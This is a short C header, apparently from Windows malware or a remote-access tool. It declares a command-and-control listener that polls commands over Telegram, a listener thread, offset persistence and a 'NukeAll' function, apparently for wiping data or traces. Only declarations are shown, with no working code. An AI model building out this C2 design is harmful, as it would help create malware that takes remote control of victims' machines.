#ifndef C2_LISTENER_H
#define C2_LISTENER_H

#include "config.h"

void SaveOffset(int offset);
int LoadOffset();
char* PollTelegramCommand(int* offset);
DWORD WINAPI CommandListenerThread(LPVOID lpParam);
void NukeAll();

#endif // C2_LISTENER_H
